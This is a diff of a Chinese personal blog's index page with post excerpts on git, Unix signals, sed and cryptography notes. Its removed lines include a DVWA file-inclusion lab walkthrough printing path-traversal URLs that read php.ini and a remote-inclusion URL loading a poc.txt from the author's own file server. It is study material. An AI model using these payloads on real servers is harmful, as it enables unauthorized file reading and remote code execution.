+<p>我们创建一个文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> &gt; hello.txt</span><br></pre></td></tr></table></figure>
+
+<p>这个时候查看 <code>git status</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No commits yet</span><br><span class="line"></span><br><span class="line">Untracked files:</span><br><span class="line">  (use <span class="string">&quot;git add &lt;file&gt;...&quot;</span> to include <span class="keyword">in</span> what will be committed)</span><br><span class="line"></span><br><span class="line">        hello.txt</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到一个`Untracked files 。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/30/missing-semester/Version%20Control%20(Git)/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/29/missing-semester/Command-line%20Environment/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/29/missing-semester/Command-line%20Environment/" class="post-title-link" itemprop="url">Command-line Environment</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-29 13:28:27" itemprop="dateCreated datePublished" datetime="2022-03-29T13:28:27+08:00">2022-03-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-30 21:41:34" itemprop="dateModified" datetime="2022-03-30T21:41:34+08:00">2022-03-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="command-line-environment">Command-line Environment</h1>
+<h2 id="signal">SIGNAL</h2>
+<p>您的 <code>shell</code> 会使用 <code>UNIX</code> 提供的信号机制执行进程间通信。</p>
+<p>我们可以使用<code>man signal</code> 来查看<code>signal</code>的帮助文档。</p>
+<p>对于如下的 <code>python</code> 程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> signal, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">signum, time</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nI got a SIGINT, but I am not stopping&quot;</span>)</span><br><span class="line"></span><br><span class="line">signal.signal(signal.SIGINT, handler)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    time.sleep(<span class="number">.1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>运行该程序后按 <code>ctrl+c</code> 会捕捉到信号程序继续运行。</p>
+<p>视频中按 <code>ctrl+\</code> 可以结束程序，但是我这里不知道为什么不行，得按 <code>ctrl+z</code>。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/29/missing-semester/Command-line%20Environment/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/28/missing-semester/Data%20Wrangling/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/28/missing-semester/Data%20Wrangling/" class="post-title-link" itemprop="url">Data Wrangling</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-28 11:08:27" itemprop="dateCreated datePublished" datetime="2022-03-28T11:08:27+08:00">2022-03-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-03-30 21:41:52" itemprop="dateModified" datetime="2022-03-30T21:41:52+08:00">2022-03-30</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="data-wrangling">Data Wrangling</h1>
+<p>以下代码可以查看服务器的日志 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh myserver journalctl</span><br></pre></td></tr></table></figure></p>
+<p>需要注意的是 <code>myserver</code> 由，<用户名>@&lt;<span class="math inline">\(ip\)</span>地址构成&gt;</用户名></p>
+<p><code>sed</code> 是一种匹配工具，<code>s</code> 命令的形式如下：<code>s/REGEX/SUBSTITUTION/</code> 其中 <code>REGEX</code> 是正则表达式，而<code>SUBSTITUTION</code> 是替代文本，也就是将匹配到的正则表达式转换为代替文本，默认只替代一遍。在后面加上<code>g</code> 可以多次匹配。</p>
+<p>为了支持更不用加上<code>\</code> 我们需要在<code>sed</code>后加上<code>-E</code></p>
+<p>以下是该命令的一些示例用法：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/28/missing-semester/Data%20Wrangling/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/27/missing-semester/Shell%20Tools%20and%20Scripting%E8%AF%BE%E5%90%8E%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="wys的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/27/missing-semester/Shell%20Tools%20and%20Scripting%E8%AF%BE%E5%90%8E%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">Shell Tools and Scripting课后练习</a>
         </h2>
 
         <div class="post-meta">
@@ -270,7 +878,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2022-03-24 18:54:27 / Modified: 20:13:08" itemprop="dateCreated datePublished" datetime="2022-03-24T18:54:27+08:00">2022-03-24</time>
+              <time title="Created: 2022-03-27 16:46:27 / Modified: 20:09:26" itemprop="dateCreated datePublished" datetime="2022-03-27T16:46:27+08:00">2022-03-27</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -278,7 +886,7 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+                  <a href="/categories/Missing-Semester/" itemprop="url" rel="index"><span itemprop="name">Missing-Semester</span></a>
                 </span>
             </span>
 
@@ -293,863 +901,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="信息安全概论6">信息安全概论（6）</h1>
-<h2 id="feistel-加密算法">Feistel 加密算法</h2>
-<p>Feistel的优点在于：由于它是对称的密码结构。所以对信息的加密和解密的过程就极为相似，甚至完全一样。这就使得在实施的过程中，加解密的设备一样，这就减少了几乎一半的成本。</p>
-<p><strong>Feistel 加密操作：</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">	L[i] = R[i<span class="number">-1</span>];</span><br><span class="line">	R[i] = L[i<span class="number">-1</span>]^<span class="built_in">F</span>(R[i<span class="number">-1</span>],K[i]);</span><br><span class="line">&#125;</span><br><span class="line">L[n+<span class="number">1</span>] = R[n];</span><br><span class="line">R[n+<span class="number">1</span>] = L[n];</span><br></pre></td></tr></table></figure>
-<p>F函数：</p>
+          <h1 id="shell-tools-and-scripting课后练习">Shell Tools and Scripting课后练习</h1>
 <ol type="1">
-<li><p>不可求逆</p></li>
-<li><p>非线性</p></li>
-<li><p>混乱性</p></li>
-<li><p>扩散性</p></li>
-<li><p>雪崩性</p></li>
-<li><p>比特独立</p></li>
+<li></li>
 </ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/21/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(4)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/21/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(4)/" class="post-title-link" itemprop="url">信息安全概论（5）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-21 21:57:27" itemprop="dateCreated datePublished" datetime="2022-03-21T21:57:27+08:00">2022-03-21</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-22 19:12:20" itemprop="dateModified" datetime="2022-03-22T19:12:20+08:00">2022-03-22</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息安全概论5">信息安全概论（5）</h1>
-<h2 id="电子时代加密">5.1.1 电子时代加密</h2>
-<p>加密本质上由两部分组成，分别为<strong>置换</strong>、<strong>替代</strong>：</p>
-<p><strong>置换</strong>（<span class="math inline">\(permutation\)</span>）：如左边第一个位置的值到右边换到第三位。左右两边1或0的个数必定相等。P-box的输入线数可以做的很大。</p>
-<figure>
-<img src="/2022/03/21/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(4)/image-20220322165135496.png" alt="image-20220322165135496"><figcaption aria-hidden="true">image-20220322165135496</figcaption>
-</figure>
-<p><strong>替代</strong>（<span class="math inline">\(substituion\)</span>）：解码器+ p-box + 编码器 构成s-box。左右两边1或0的个数不一定相等。他的输入线数不适合做很大。</p>
-<figure>
-<img src="/2022/03/21/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(4)/image-20220322170743324.png" alt="image-20220322170743324"><figcaption aria-hidden="true">image-20220322170743324</figcaption>
-</figure>
-<p>组合：并联 + 串联，同时引入密钥，就构成了DES加密算法的雏形。</p>
-<figure>
-<img src="/2022/03/21/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(4)/image-20220322172125431.png" alt="image-20220322172125431"><figcaption aria-hidden="true">image-20220322172125431</figcaption>
-</figure>
-<p>由于S盒输入线数不适合做的很大，所以可以采用多个S盒并联和然后和P盒串联来构成一轮加密操作。每一轮加密操作之前明文都要和密钥进行异或操作。</p>
-<h2 id="des的简介">5.2.1 DES的简介</h2>
-<p>DES利用56比特串长度的密码来加密长度为64位的明文，经过16轮运算，得到长度为64位的密文。密钥通过16轮密钥扩展算法生成16个子密钥。</p>
-<figure>
-<img src="/2022/03/21/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(4)/image-20220322180312723.png" alt="image-20220322180312723"><figcaption aria-hidden="true">image-20220322180312723</figcaption>
-</figure>
-<h2 id="简化des的轮密钥生成">5.3.1 简化DES的轮密钥生成</h2>
-<ol type="1">
-<li>先对密钥按一定顺序进行排列。</li>
-<li>然后将密钥进行分组。</li>
-<li>对每组中的密钥循环左移。</li>
-<li>重新组合成<code>56-bit</code>。</li>
-<li>然后再按另一种方式进行全排列。</li>
-</ol>
-<h2 id="简化des轮过程">5.4.1 简化DES轮过程</h2>
-<ol type="1">
-<li>将明文分为左右两部分。</li>
-<li>将右明文进行扩展。</li>
-<li>将结果与子密钥进行异或。</li>
-<li>将扩展比特的字符串转化为原位数。</li>
-<li>将得到的结果与左明文异或作为右明文，原右明文作为左明文。</li>
-</ol>
-<h2 id="计算机时代">5.5.1 计算机时代</h2>
-<p><strong>扩散</strong>（Diffusion）：明文的统计结构被扩散消失到密文的长程统计特性，使得明文和密文之间的统计关系尽量复杂。</p>
-<p><strong>混乱</strong>（confusion）：使得密文的统计特性与密钥的取值之间的关系尽量复杂。</p>
-<h4 id="好加密算法的现象雪崩效应">好加密算法的现象——雪崩效应</h4>
-<p>明文或密文变化1bit密文所有bit都可能发生变化。</p>
-<blockquote>
-<p>The best is : 每bit变化的概率为<span class="math inline">\(\frac{1}{2}\)</span> ,且bit之间变化相互独立。</p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/19/%E7%BD%91%E7%BB%9C/webserver%E6%B6%88%E6%81%AF%E6%B5%81%E5%8A%A8%E5%9B%BE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/19/%E7%BD%91%E7%BB%9C/webserver%E6%B6%88%E6%81%AF%E6%B5%81%E5%8A%A8%E5%9B%BE/" class="post-title-link" itemprop="url">Web Server消息流动图</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-19 10:32:27" itemprop="dateCreated datePublished" datetime="2022-03-19T10:32:27+08:00">2022-03-19</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-21 22:21:33" itemprop="dateModified" datetime="2022-03-21T22:21:33+08:00">2022-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <figure>
-<img src="/2022/03/19/%E7%BD%91%E7%BB%9C/webserver%E6%B6%88%E6%81%AF%E6%B5%81%E5%8A%A8%E5%9B%BE/image-20220319105552186.png" alt="webserver消息流动图"><figcaption aria-hidden="true">webserver消息流动图</figcaption>
-</figure>
-<ul>
-<li>Server
-<ul>
-<li>监听进来的TCP字节流</li>
-</ul></li>
-<li>Router
-<ul>
-<li>接受HTTP请求，并决定调用哪个Handler</li>
-</ul></li>
-<li>Handler
-<ul>
-<li>处理HTTP请求，构建HTTP响应</li>
-</ul></li>
-<li>HTTP Library
-<ul>
-<li>解释字节流，把它转化为HTTP请求</li>
-<li>把HTTP响应转化回字节流</li>
-</ul></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/18/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(3)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/18/%E7%BD%91%E7%BB%9C/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%A6%82%E8%AE%BA(3)/" class="post-title-link" itemprop="url">信息安全概论（3）</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-18 14:51:27" itemprop="dateCreated datePublished" datetime="2022-03-18T14:51:27+08:00">2022-03-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-21 22:21:06" itemprop="dateModified" datetime="2022-03-21T22:21:06+08:00">2022-03-21</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="信息安全概论3">信息安全概论（3）</h1>
-<h2 id="磁盘加密">磁盘加密</h2>
-<p><code>Truecrypt</code> 这个貌似是上古遗物了，现在貌似都用<code>BitLocker</code>？</p>
-<p><code>Truecrypt</code> 这个东西貌似支持双密码，一个真密码一个假密码。</p>
-<p>用到加密的数据的时候就把他挂载到硬盘上，不用的时候就取消挂载，这样数据就读不出来了。</p>
-<p>软件开源。</p>
-<h2 id="邮件加密">邮件加密</h2>
-<p><code>pgp4win</code></p>
-<p>这个软件可以支持双钥密码<strong>加密密钥公开</strong>的应用，也可以支持双钥密码<strong>解密密钥公开</strong>的应用。</p>
-<p>软件开源。</p>
-<p><code>thunderbird</code></p>
-<p>邮件客户端，也支持加密解密。也是上古遗物了。</p>
-<p>软件</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://101.35.161.126/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="wys的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="post-title-link" itemprop="url">文件包含漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-03-17 15:57:27" itemprop="dateCreated datePublished" datetime="2022-03-17T15:57:27+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-03-19 10:44:27" itemprop="dateModified" datetime="2022-03-19T10:44:27+08:00">2022-03-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="文件包含">文件包含</h1>
-<h2 id="概念">概念</h2>
-<p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
-<h2 id="低等级">低等级</h2>
-<ol type="1">
-<li>在网页上，服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</li>
-</ol>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png"></p>
-<p>可以看到依次点击可以返回<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 的内容</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png"></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png"></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png"></p>
-<p>随便输入一个文件名</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png"></p>
-<p>报错，页面显示错误信息，没有这个文件（因为不是系统），但是暴露了服务器文件的绝对路径，于是根据经验找到了一些有趣的东西</p>
-<p>构造绝对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=E:\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
-<p>构造相对路径：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
-<p>可以得到文件的内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png"></p>
-<h3 id="远程文件包含">远程文件包含</h3>
-<p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
-<p>我们新建一个txt文件，输入以下内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png"></p>
-<p>我们用python创建一个文件服务器</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png"></p>
-<p>可以看到我们成功创建了一个文件服务器并上传了一个文件：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png"></p>
-<p>我们通过输入url</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.*.*/dvwa/vulnerabilities/fi/?page=http://10.19.*.*:8000/poc.txt</span><br></pre></td></tr></table></figure>
-<p>可以成功的得到php的信息</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png"></p>
-<h3 id="中等级">中等级</h3>
